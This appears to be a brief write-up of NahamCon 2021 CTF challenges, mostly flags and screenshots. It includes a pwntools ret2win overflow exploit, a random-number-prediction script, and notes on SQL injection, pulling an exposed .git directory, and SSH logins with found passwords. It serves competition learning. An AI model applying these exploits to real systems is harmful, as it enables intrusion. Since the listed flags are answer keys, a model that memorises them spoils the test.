# NahamCon CTF

#### Rules Source code
```flag{90bc54705794a62015369fd8e86e557b}```

### Nahamcon2021
```flag{e36bc5a67dd2fe5f33b62123f78fbcef}```

### Echo

![image](https://user-images.githubusercontent.com/1076452/111018313-e7124780-8396-11eb-8fa1-b99817861f79.png)

![image](https://user-images.githubusercontent.com/1076452/111018299-d6fa6800-8396-11eb-8e52-279d10ecd11a.png)

![image](https://user-images.githubusercontent.com/1076452/111018288-cba73c80-8396-11eb-8d5b-53e1e3203942.png)

```flag{1beadaf44586ea4aba2ea9a00c5b6d91}```

### Homeward Bound

![image](https://user-images.githubusercontent.com/1076452/111000058-25d8db00-8360-11eb-9b99-3a045d6fd1f2.png)

![image](https://user-images.githubusercontent.com/1076452/111000087-30937000-8360-11eb-998c-07f49f530a66.png)

```flag{26080a2216e95746ec3e932002b9baa4}```

### Shoelaces

strings shoelaces.jpg | grep flag

```flag{137288e960a3ae9b148e8a7db16a69b0}```

### Pollex

binwalk --dd='.*' pollex

![image](https://user-images.githubusercontent.com/1076452/111015405-6435c080-8387-11eb-8b51-a97ce86ac290.png)

```flag{65c34a1ec121a286600ddd48fe36bc00}```

### Car Keys

![image](https://user-images.githubusercontent.com/1076452/111019745-e7631080-839f-11eb-9708-59de62d02bc9.png)

```flag{6f980c0101c8aa361977cac06508a3de}```

### Eighth Circle

http://www.malbolge.doleczek.pl/

![image](https://user-images.githubusercontent.com/1076452/111020021-baaff880-83a1-11eb-8efd-e168fd0f6bdd.png)

### Henpeck

```tshark -r ./henpeck.pcap -Y 'usb.capdata && usb.data_len == 8' -T fields -e usb.capdata | sed 's/../:&/g2' > keyboards.txt```

https://github.com/TeamRocketIst/ctf-usb-keyboard-parser

```
python usbkeyboard.py keyboards.txt 
so the answer is flag{f7733e0093b7d281dd0a30fcf34a9634} hahahah lol
```

### Ret2basic

```
#!/usr/bin/python
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./ret2basic')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./ret2basic', gdbscript=gs)
    if args.REMOTE:
        return remote('challenge.nahamcon.com', 30413)
    else:
        return process('./ret2basic')
r = start()
#========= exploit here ===================
win = 0x401215
#ret = 0x40133b
payload = "A" * 120
#payload += p64(ret)
payload += p64(win)
r.sendlineafter(": ",payload)

#========= interactive ====================
r.interactive()
```

![image](https://user-images.githubusercontent.com/1076452/111002592-810ccc80-8364-11eb-9f58-0ca4bb807ed0.png)

### The List

```flag{0eb219803dbfcda8620dae0772ae2d72}```

### esab64

cat esab64 | rev | base64 -d | rev

```flag{fb5211b498afe87b1bd0db601117e16e}```

### Resourceful

![image](https://user-images.githubusercontent.com/1076452/111007125-e1077100-836c-11eb-9a10-edb11904272d.png)

![image](https://user-images.githubusercontent.com/1076452/111007090-cf25ce00-836c-11eb-989e-3e9f1d579b6c.png)

![image](https://user-images.githubusercontent.com/1076452/111007110-da78f980-836c-11eb-9510-ce5ad11a8954.png)

```flag{7eecc051f5cb3a40cd6bda40de6eeb32}```

### Chicken wings 

https://lingojam.com/WingDing

```flag{e0791ce68f718188c0378b1c0a3bdc9e}```

### Andra

![image](https://user-images.githubusercontent.com/1076452/111007452-a9e58f80-836d-11eb-8fcb-2b86f03bf057.png)

![image](https://user-images.githubusercontent.com/1076452/111007468-b2d66100-836d-11eb-91b5-ac0fed2e04a5.png)

![image](https://user-images.githubusercontent.com/1076452/111007499-b833ab80-836d-11eb-892e-e2854621be02.png)

```flag{d9f72316dbe7ceab0db10bed1a738482}```

### Merch Store

Source code merch store

```flag{fafc10617631126361c693a2a3fce5a7} ```

### Bad Blog

SQLi En user agent
![image](https://user-images.githubusercontent.com/1076452/111036069-1c9d4c00-83fc-11eb-8b89-be0cd7109da4.png)

![image](https://user-images.githubusercontent.com/1076452/111036081-2e7eef00-83fc-11eb-9070-ff2fe726a45b.png)

![image](https://user-images.githubusercontent.com/1076452/111036096-40609200-83fc-11eb-91ee-bece11537691.png)

![image](https://user-images.githubusercontent.com/1076452/111036157-8e759580-83fc-11eb-8e5d-18b9580a45c2.png)

![image](https://user-images.githubusercontent.com/1076452/111036146-8158a680-83fc-11eb-883a-568c950166ae.png)

![image](https://user-images.githubusercontent.com/1076452/111036109-4eaeae00-83fc-11eb-820f-9789a85bca4d.png)

```flag{8b31eecb1831ed594fa27ef5b431fe34}```

### Dice Roll

```
#!/usr/bin/env python
from pwn import *
from randcrack import RandCrack

rc = RandCrack()
r = remote('challenge.nahamcon.com', 31784)

def roll():
    r.sendlineafter("> ","2")
    r.recvline()
    data = r.recvline()
    rc.submit(int(data))

def guess(num):
    print("Guessing the dice...")
    r.sendlineafter("> ","3")
    r.sendlineafter("> ","{}".format(num))
    data = r.recvline()
    print(data)
    r.recvline()
    data = r.recvline()
    print(data)

print("Getting data to make prediction...")
for i in range(624):
    roll()

num = rc.predict_getrandbits(32)
print("Predicted: {}".format(num))
guess(num)
```

![image](https://user-images.githubusercontent.com/1076452/111038864-db139d80-8409-11eb-9023-5fbcb952e2ea.png)

```flag{e915b62b2195d76bfddaac0160ed3194}```

## Mission

Source code

![image](https://user-images.githubusercontent.com/1076452/111015203-6ea38a80-8386-11eb-833a-647bffe6b2b6.png)

```flag{48e117a1464c3202714dc9a350533a59}```

### Bionic

![image](https://user-images.githubusercontent.com/1076452/111012004-27170180-837a-11eb-8aa6-8f0434726b1b.png)

### Meet The Team

https://github.com/internetwache/GitTools

https://constellations.page/.git/

git show

![image](https://user-images.githubusercontent.com/1076452/111013989-719b7c80-8380-11eb-9d8b-719daeb8cbe1.png)


### Gus

![image](https://user-images.githubusercontent.com/1076452/111011972-ffc03480-8379-11eb-8996-25197d69882c.png)


### Hercules

![image](https://user-images.githubusercontent.com/1076452/111013207-5da24b80-837d-11eb-94b6-fa2ce6b44d39.png)

### Lyra

![image](https://user-images.githubusercontent.com/1076452/111014284-c986b300-8381-11eb-86a2-847f0693ee78.png)

![image](https://user-images.githubusercontent.com/1076452/111014303-de634680-8381-11eb-85ee-3b94b44dac07.png)

![image](https://user-images.githubusercontent.com/1076452/111014312-ea4f0880-8381-11eb-9bfb-d8e0a0ae7060.png)

### Orion

https://twitter.com/OrionMorra/status/1363789936219082756

![image](https://user-images.githubusercontent.com/1076452/111014551-ea9bd380-8382-11eb-9418-a6b223bd1c13.png)

### Leo

![image](https://user-images.githubusercontent.com/1076452/111017557-1c1c9b00-8393-11eb-8485-7011fa58aea8.png)

![image](https://user-images.githubusercontent.com/1076452/111017573-2b034d80-8393-11eb-996e-b7169e37a59f.png)

``` flag{636db5f4f0e36908a4f1a4edc5b0676e}  A password for Leo is `constelleorising` ```


### Sensible

Entrar con datos de leo


### Hydraulic

![image](https://user-images.githubusercontent.com/1076452/111021178-5133e800-83a9-11eb-8fb5-8724f47169f7.png)

```[ssh] host: challenge.nahamcon.com   login: pavo   password: starsinthesky```

![image](https://user-images.githubusercontent.com/1076452/111021210-8b9d8500-83a9-11eb-8aac-24088f8267f2.png)

```flag{cadbbfd75d2547700221f8c2588e026e}```

### Banking On It

Entrar con user gus y id_rsa

### Internal


### Degrade

![image](https://user-images.githubusercontent.com/1076452/111021372-7a08ad00-83aa-11eb-80c7-5ecc86733971.png)

### Centaurus

![image](https://user-images.githubusercontent.com/1076452/111052561-9d7b3880-843a-11eb-9c3e-7bd1e74b1e44.png)

![image](https://user-images.githubusercontent.com/1076452/111052567-b257cc00-843a-11eb-9555-6d4ad8dec3a2.png)

![image](https://user-images.githubusercontent.com/1076452/111052569-bd126100-843a-11eb-8e22-f329691d9a0e.png)

![image](https://user-images.githubusercontent.com/1076452/111052573-c7ccf600-843a-11eb-866f-9f8872ffbfd6.png)

```flag{4a8f943a965086945794066f7ce97f23}```

